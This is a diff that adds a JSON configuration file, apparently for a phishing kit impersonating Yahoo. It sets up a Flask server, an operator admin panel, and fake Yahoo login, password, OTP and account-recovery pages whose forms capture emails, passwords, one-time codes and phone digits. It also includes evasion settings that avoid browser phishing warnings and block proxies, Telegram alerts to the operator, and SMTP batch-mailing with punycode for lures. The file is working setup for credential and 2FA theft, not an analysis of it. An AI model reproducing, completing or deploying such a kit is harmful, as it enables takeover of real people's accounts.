@@ -1,0 +1,231 @@
+{
+    "version": "0.0",
+    "service": "Yahoo",
+    "flask": {
+        "host": "0.0.0.0",
+        "port": 3000,
+        "debug": true
+    },
+    "mysql": {
+        "host": "localhost",
+        "user": "root",
+        "password": "",
+        "database": "",
+        "port": 3306
+    },
+    "admin": {
+        "login_route": "/adminlogin",
+        "dashboard_route": "/admin",
+        "password": "admin_pass"
+    },
+    "waiting": "/waiting",
+    "background_color": "rgb(14 14 14 / 1)",
+    "param_conf": {
+        "action": "save_config",
+        "count": 0,
+        "params": {},
+        "source": "admin_interface"
+    },
+    "api_keys": {
+        "proxycheck": ""
+    },
+    "options": {
+    	"page_title": "Yahoo - Processing",
+        "favicon_url": "https://s.yimg.com/rz/l/favicon.ico",
+        "panel_status": true,
+        "anti_redpage": true,
+        "block_proxy": false,
+        "mobile_only": false,
+        "hide_route": true,
+        "showNotifications": true,
+        "deleteInactiveSessions": "true",
+        "inactiveSessionTimeoutMinutes": 30,
+        "redirectURL": "google.com",
+        "workflow_mode": false,
+        "workflow_pages": [],
+        "telegram": {
+            "telegram_bot": null,
+            "telegram_bot_username": "",
+            "telegram_notification": null,
+            "telegram_chat_id": "",
+            "telegram_bot_token": "",
+            "admin_ids": []
+        },
+        "soundEffects": true,
+        "admin_whitelist": []
+    },
+    "email": {
+        "smtp_servers": [],
+        "email_details": {
+            "batch_size": 20,
+            "punycode": true
+        }
+    },
+    "data_links": [],
+    "pages": {
+        "yahoo_captcha": {
+            "template": "/yahoo/captcha.html",
+            "route": "/yahoo_captcha",
+            "panel": {
+                "input": {
+                    "name": "Captcha (Empty)",
+                    "values": [],
+                    "required_data": []
+                }
+            },
+            "form": {},
+            "preview_image": "/previews/yahoo/captcha.png"
+        },
+        "yahoo_invalid": {
+            "template": "/yahoo/invalid.html",
+            "route": "/yahoo_invalid",
+            "panel": {
+                "input": {
+                    "name": "Yahoo Invalid Password",
+                    "values": [
+                        {
+                            "value": "password",
+                            "placeholder": "\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022",
+                            "type": "text"
+                        }
+                    ],
+                    "required_data": [
+                        {
+                            "value": "email",
+                            "placeholder": "example@yahoo.com",
+                            "placeholder_name": "email",
+                            "type": "text"
+                        }
+                    ]
+                }
+            },
+            "form": {
+                "password": "password"
+            },
+            "preview_image": "/previews/yahoo/invalid.png"
+        },
+        "yahoo_login": {
+            "template": "/yahoo/login.html",
+            "formName": "login-username-form",
+            "route": "/yahoo_login",
+            "panel": {
+                "input": {
+                    "name": "Yahoo Email",
+                    "values": [
+                        {
+                            "value": "email",
+                            "placeholder": "Sample text",
+                            "type": "text"
+                        }
+                    ],
+                    "required_data": []
+                }
+            },
+            "form": {
+                "email": "email"
+            },
+            "preview_image": "/previews/yahoo/login.png"
+        },
+        "yahoo_otp": {
+            "template": "/yahoo/otp.html",
+            "formName": "otp_form",
+            "route": "/yahoo_otp",
+            "panel": {
+                "input": {
+                    "name": "Yahoo OTP",
+                    "values": [
+                        {
+                            "value": "otpcode",
+                            "placeholder": "OTP Code",
+                            "type": "text"
+                        }
+                    ],
+                    "required_data": [
+                        {
+                            "value": "phone",
+                            "placeholder": "Last 2 digits of phone number",
+                            "type": "text"
+                        }
+                    ]
+                }
+            },
+            "form": {
+                "otpcode": "otpcode"
+            },
+            "preview_image": "/previews/yahoo/otp.png"
+        },
+        "yahoo_password": {
+            "template": "/yahoo/password.html",
+            "route": "/yahoo_password",
+            "panel": {
+                "input": {
+                    "name": "Yahoo Password",
+                    "values": [
+                        {
+                            "value": "password",
+                            "placeholder": "\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022",
+                            "type": "text"
+                        }
+                    ],
+                    "required_data": [
+                        {
+                            "value": "email",
+                            "placeholder_name": "email",
+                            "placeholder": "example@yahoo.com",
+                            "type": "text"
+                        }
+                    ]
+                }
+            },
+            "form": {
+                "password": "password"
+            },
+            "preview_image": "/previews/yahoo/password.png"
+        },
+        "yahoo_recovery": {
+            "template": "/yahoo/recovery.html",
+            "route": "/yahoo_recovery",
+            "panel": {
+                "input": {
+                    "name": "Yahoo Recovery",
+                    "values": [
+                        {
+                            "value": "email",
+                            "placeholder": "example@yahoo.com",
+                            "type": "email"
+                        },
+                        {
+                            "value": "phone",
+                            "placeholder": "+1 (123) 456-7890",
+                            "type": "text"
+                        }
+                    ],
+                    "required_data": [
+                        {
+                            "value": "placeholder",
+                            "placeholder": "example@yahoo.com",
+                            "type": "text"
+                        }
+                    ]
+                }
+            },
+            "form": {
+                "email": "email",
+                "phone": "phone"
+            },
+            "preview_image": "/previews/yahoo/recovery.png"
+        },
+        "yahoo_waiting": {
+            "template": "/yahoo/waiting.html",
+            "route": "/yahoo_waiting",
+            "panel": {
+                "input": {
+                    "values": [],
+                    "required_data": []
+                }
+            },
+            "form": {},
+            "preview_image": "/previews/yahoo/waiting.png"
+        }
+    }
+}
